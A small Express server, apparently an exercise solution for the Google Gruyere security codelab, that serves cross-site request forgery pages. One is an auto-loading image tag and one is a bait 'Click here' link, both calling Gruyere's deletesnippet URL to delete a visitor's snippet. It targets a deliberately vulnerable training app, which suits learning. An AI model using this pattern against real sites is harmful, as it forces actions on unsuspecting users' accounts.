'use strict'

const default_port = 8888
const port = process.argv[2] || default_port


const express = require('express')
const app = express()

app.use("/image", (req, res) => {
    res.send(`<img src="https://google-gruyere.appspot.com/354189677610052710631975174902398196525/deletesnippet?index=0">`);
})
app.use("/", (req, res) => {
    res.send(`<h1><a href="https://google-gruyere.appspot.com/354189677610052710631975174902398196525/deletesnippet?index=0">!!!Click here!!!</a>`);
})

app.listen(port, () => console.log(`Listening ${port}`))